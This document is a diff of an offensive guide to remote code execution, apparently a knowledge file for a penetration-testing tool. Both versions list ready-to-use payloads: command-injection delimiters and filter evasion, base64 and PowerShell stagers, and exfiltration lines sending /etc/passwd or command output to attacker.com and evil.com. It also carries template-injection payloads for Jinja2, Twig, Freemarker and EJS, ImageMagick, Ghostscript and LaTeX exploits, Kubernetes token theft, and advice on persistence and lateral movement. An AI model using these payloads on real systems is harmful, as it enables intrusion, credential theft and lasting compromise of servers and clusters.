@@ -1,206 +1,154 @@
 <rce_vulnerability_guide>
-<title>REMOTE CODE EXECUTION (RCE) - MASTER EXPLOITATION</title>
+<title>REMOTE CODE EXECUTION (RCE)</title>
 
-<critical>RCE is the holy grail - complete system compromise. Modern RCE requires sophisticated bypass techniques.</critical>
+<critical>RCE leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media pipelines, and build/runtime tooling. Focus on quiet, portable oracles and chain to stable shells only when needed.</critical>
 
-<common_injection_contexts>
-- System commands: ping, nslookup, traceroute, whois
-- File operations: upload, download, convert, resize
-- PDF generators: wkhtmltopdf, phantomjs
-- Image processors: ImageMagick, GraphicsMagick
-- Media converters: ffmpeg, sox
-- Archive handlers: tar, zip, 7z
-- Version control: git, svn operations
-- LDAP queries
-- Database backup/restore
-- Email sending functions
-</common_injection_contexts>
+<scope>
+- OS command execution via wrappers (shells, system utilities, CLIs)
+- Dynamic evaluation: template engines, expression languages, eval/vm
+- Insecure deserialization and gadget chains across languages
+- Media/document toolchains (ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg)
+- SSRF→internal services that expose execution primitives (FastCGI, Redis)
+- Container/Kubernetes escalation from app RCE to node/cluster compromise
+</scope>
 
-<detection_methods>
+<methodology>
+1. Identify sinks: search for command wrappers, template rendering, deserialization, file converters, report generators, and plugin hooks.
+2. Establish a minimal oracle: timing, DNS/HTTP callbacks, or deterministic output diffs (length/ETag). Prefer OAST over noisy time sleeps.
+3. Confirm context: which user, working directory, PATH, shell, SELinux/AppArmor, containerization, read/write locations, outbound egress.
+4. Progress to durable control: file write, scheduled execution, service restart hooks; avoid loud reverse shells unless necessary.
+</methodology>
+
+<detection_channels>
 <time_based>
-- Linux/Unix: ;sleep 10 # | sleep 10 # `sleep 10` $(sleep 10)
-- Windows: & ping -n 10 127.0.0.1 & || ping -n 10 127.0.0.1 ||
-- PowerShell: ;Start-Sleep -s 10 #
+- Unix: ;sleep 1 | `sleep 1` || sleep 1; gate delays with short subcommands to reduce noise
+- Windows CMD/PowerShell: & timeout /t 2 & | Start-Sleep -s 2 | ping -n 2 127.0.0.1
 </time_based>
 
-<dns_oob>
-- nslookup $(whoami).attacker.com
-- ping $(hostname).attacker.com
-- curl http://$(cat /etc/passwd | base64).attacker.com
-</dns_oob>
+<oast>
+- DNS: {% raw %}nslookup $(whoami).x.attacker.tld{% endraw %} or {% raw %}curl http://$(id -u).x.attacker.tld{% endraw %}
+- HTTP beacon: {% raw %}curl https://attacker.tld/$(hostname){% endraw %} (or fetch to pre-signed URL)
+</oast>
 
 <output_based>
-- Direct: ;cat /etc/passwd
-- Encoded: ;cat /etc/passwd | base64
-- Hex: ;xxd -p /etc/passwd
+- Direct: ;id;uname -a;whoami
+- Encoded: ;(id;hostname)|base64; hex via xxd -p
 </output_based>
-</detection_methods>
+</detection_channels>
 
-<command_injection_vectors>
-<basic_payloads>
-; id
-| id
-|| id
-& id
-&& id
-`id`
-$(id)
-${IFS}id
-</basic_payloads>
+<command_injection>
+<delimiters_and_operators>
+- ; | || & && `cmd` $(cmd) $() ${IFS} newline/tab; Windows: & | || ^
+</delimiters_and_operators>
 
-<bypass_techniques>
-- Space bypass: ${IFS}, $IFS$9, <, %09 (tab)
-- Blacklist bypass: w'h'o'a'm'i, w"h"o"a"m"i
-- Command substitution: $(a=c;b=at;$a$b /etc/passwd)
-- Encoding: echo 'aWQ=' | base64 -d | sh
-- Case variation: WhOaMi (Windows)
-</bypass_techniques>
-</command_injection_vectors>
+<argument_injection>
+- Inject flags/filenames into CLI arguments (e.g., --output=/tmp/x; --config=); break out of quoted segments by alternating quotes and escapes
+- Environment expansion: $PATH, ${HOME}, command substitution; Windows %TEMP%, !VAR!, PowerShell $(...)
+</argument_injection>
 
-<language_specific_rce>
-<php>
-- eval() with user input
-- system(), exec(), shell_exec(), passthru()
-- preg_replace with /e modifier
-- assert() with string input
-- unserialize() exploitation
-</php>
+<path_and_builtin_confusion>
+- Force absolute paths (/usr/bin/id) vs relying on PATH; prefer builtins or alternative tools (printf, getent) when id is filtered
+- Use sh -c or cmd /c wrappers to reach the shell even if binaries are filtered
+</path_and_builtin_confusion>
 
-<python>
-- eval(), exec()
-- subprocess.call(shell=True)
-- os.system()
-- pickle deserialization
-- yaml.load()
-</python>
+<evasion>
+- Whitespace/IFS: ${IFS}, $'\t', <; case/Unicode variations; mixed encodings; backslash line continuations
+- Token splitting: w'h'o'a'm'i, w"h"o"a"m"i; build via variables: a=i;b=d; $a$b
+- Base64/hex stagers: echo payload | base64 -d | sh; PowerShell: IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))
+</evasion>
+</command_injection>
 
-<java>
-- Runtime.getRuntime().exec()
-- ProcessBuilder
-- ScriptEngine eval
-- JNDI injection
-- Expression Language injection
-</java>
+<template_injection>
+- Identify server-side template engines: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug
+- Move from expression to code execution primitives (read file, run command)
+- Minimal probes:
+{% raw %}
+Jinja2: {{7*7}} → {{cycler.__init__.__globals__['os'].popen('id').read()}}
+Twig: {{7*7}} → {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+Freemarker: ${7*7} → <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
+EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
+{% endraw %}
+</template_injection>
 
-<nodejs>
-- eval()
-- child_process.exec()
-- vm.runInContext()
-- require() pollution
-</nodejs>
-</language_specific_rce>
+<deserialization_and_el>
+- Java: gadget chains via CommonsCollections/BeanUtils/Spring; tools: ysoserial; JNDI/LDAP chains (Log4Shell-style) when lookups are reachable
+- .NET: BinaryFormatter/DataContractSerializer/APIs that accept untrusted ViewState without MAC
+- PHP: unserialize() and PHAR metadata; autoloaded gadget chains in frameworks and plugins
+- Python/Ruby: pickle, yaml.load/unsafe_load, Marshal; seek auto-deserialization in message queues/caches
+- Expression languages: OGNL/SpEL/MVEL/EL; reach Runtime/ProcessBuilder/exec
+</deserialization_and_el>
 
-<advanced_exploitation>
-<polyglot_payloads>
-Works in multiple contexts:
-;id;#' |id| #" |id| #
-{% raw %}${{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}{% endraw %}
-</polyglot_payloads>
+<media_and_document_pipelines>
+- ImageMagick/GraphicsMagick: policy.xml may limit delegates; still test legacy vectors and complex file formats
+{% raw %}
+Example: push graphic-context\nfill 'url(https://x.tld/a"|id>/tmp/o")'\npop graphic-context
+{% endraw %}
+- Ghostscript: PostScript in PDFs/PS; {% raw %}%pipe%id{% endraw %} file operators
+- ExifTool: crafted metadata invoking external tools or library bugs (historical CVEs)
+- LaTeX: \write18/--shell-escape, \input piping; pandoc filters
+- ffmpeg: concat/protocol tricks mediated by compile-time flags
+</media_and_document_pipelines>
 
-<blind_rce>
-- DNS exfiltration: $(whoami).evil.com
-- HTTP callbacks: curl evil.com/$(id)
-- Time delays for boolean extraction
-- Write to web root
-</blind_rce>
+<ssrf_to_rce>
+- FastCGI: gopher:// to php-fpm (build FPM records to invoke system/exec via vulnerable scripts)
+- Redis: gopher:// write cron/authorized_keys or webroot if filesystem exposed; or module load when allowed
+- Admin interfaces: Jenkins script console, Spark UI, Jupyter kernels reachable internally
+</ssrf_to_rce>
 
-<chained_exploitation>
-1. Command injection → Write webshell
-2. File upload → LFI → RCE
-3. XXE → SSRF → internal RCE
-4. SQLi → INTO OUTFILE → RCE
-</chained_exploitation>
-</advanced_exploitation>
-
-<specific_contexts>
-<imagemagick>
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://evil.com/image.jpg"|id > /tmp/output")'
-pop graphic-context
-</imagemagick>
-
-<ghostscript>
-%!PS
-/outfile (%pipe%id) (w) file def
-</ghostscript>
-
-<ffmpeg>
-#EXTM3U
-#EXT-X-TARGETDURATION:1
-#EXTINF:1.0,
-concat:|file:///etc/passwd
-</ffmpeg>
-
-<latex>
-\immediate\write18{id > /tmp/pwn}
-\input{|"cat /etc/passwd"}
-</latex>
-</specific_contexts>
-
-<container_escapes>
+<container_and_kubernetes>
 <docker>
-- Privileged containers: mount host filesystem
-- Docker.sock exposure
-- Kernel exploits
-- /proc/self/exe overwrite
+- From app RCE, inspect /.dockerenv, /proc/1/cgroup; enumerate mounts and capabilities (capsh --print)
+- Abuses: mounted docker.sock, hostPath mounts, privileged containers; write to /proc/sys/kernel/core_pattern or mount host with --privileged
 </docker>
 
 <kubernetes>
-- Service account tokens
-- Kubelet API access
-- Container breakout to node
+- Steal service account token from /var/run/secrets/kubernetes.io/serviceaccount; query API for pods/secrets; enumerate RBAC
+- Talk to kubelet on 10250/10255; exec into pods; list/attach if anonymous/weak auth
+- Escalate via privileged pods, hostPath mounts, or daemonsets if permissions allow
 </kubernetes>
-</container_escapes>
+</container_and_kubernetes>
 
-<waf_bypasses>
-- Unicode normalization
-- Double URL encoding
-- Case variation mixing
-- Null bytes: %00
-- Comments: /**/i/**/d
-- Alternative commands: hostname vs uname -n
-- Path traversal: /usr/bin/id vs id
-</waf_bypasses>
+<post_exploitation>
+- Privilege escalation: sudo -l; SUID binaries; capabilities (getcap -r / 2>/dev/null)
+- Persistence: cron/systemd/user services; web shell behind auth; plugin hooks; supply chain in CI/CD
+- Lateral movement: pivot with SSH keys, cloud metadata credentials, internal service tokens
+</post_exploitation>
+
+<waf_and_filter_bypasses>
+- Encoding differentials (URL, Unicode normalization), comment insertion, mixed case, request smuggling to reach alternate parsers
+- Absolute paths and alternate binaries (busybox, sh, env); Windows variations (PowerShell vs CMD), constrained language bypasses
+</waf_and_filter_bypasses>
 
 <validation>
-To confirm RCE:
-1. Execute unique command (id, hostname)
-2. Demonstrate file system access
-3. Show command output retrieval
-4. Achieve reverse shell
-5. Prove consistent execution
+1. Provide a minimal, reliable oracle (DNS/HTTP/timing) proving code execution.
+2. Show command context (uid, gid, cwd, env) and controlled output.
+3. Demonstrate persistence or file write under application constraints.
+4. If containerized, prove boundary crossing attempts (host files, kube APIs) and whether they succeed.
+5. Keep PoCs minimal and reproducible across runs and transports.
 </validation>
 
 <false_positives>
-NOT RCE if:
-- Only crashes application
-- Limited to specific commands
-- Sandboxed/containerized properly
-- No actual command execution
-- Output not retrievable
+- Only crashes or timeouts without controlled behavior
+- Filtered execution of a limited command subset with no attacker-controlled args
+- Sandboxed interpreters executing in a restricted VM with no IO or process spawn
+- Simulated outputs not derived from executed commands
 </false_positives>
 
 <impact>
-- Complete system compromise
-- Data exfiltration
-- Lateral movement
-- Backdoor installation
-- Service disruption
+- Remote system control under application user; potential privilege escalation to root
+- Data theft, encryption/signing key compromise, supply-chain insertion, lateral movement
+- Cluster compromise when combined with container/Kubernetes misconfigurations
 </impact>
 
 <pro_tips>
-1. Try all delimiters: ; | || & &&
-2. Test both Unix and Windows commands
-3. Use time-based for blind confirmation
-4. Chain with other vulnerabilities
-5. Check sudo permissions post-exploit
-6. Look for SUID binaries
-7. Test command substitution variants
-8. Monitor DNS for blind RCE
-9. Try polyglot payloads first
-10. Document full exploitation path
+1. Prefer OAST oracles; avoid long sleeps—short gated delays reduce noise.
+2. When command injection is weak, pivot to file write or deserialization/SSTI paths for stable control.
+3. Treat converters/renderers as first-class sinks; many run out-of-process with powerful delegates.
+4. For Java/.NET, enumerate classpaths/assemblies and known gadgets; verify with out-of-band payloads.
+5. Confirm environment: PATH, shell, umask, SELinux/AppArmor, container caps; it informs payload choice.
+6. Keep payloads portable (POSIX/BusyBox/PowerShell) and minimize dependencies.
+7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops.
 </pro_tips>
 
-<remember>Modern RCE often requires chaining vulnerabilities and bypassing filters. Focus on blind techniques, WAF bypasses, and achieving stable shells. Always test in the specific context - ImageMagick RCE differs from command injection.</remember>
+<remember>RCE is a property of the execution boundary. Find the sink, establish a quiet oracle, and escalate to durable control only as far as necessary. Validate across transports and environments; defenses often differ per code path.</remember>
 </rce_vulnerability_guide>
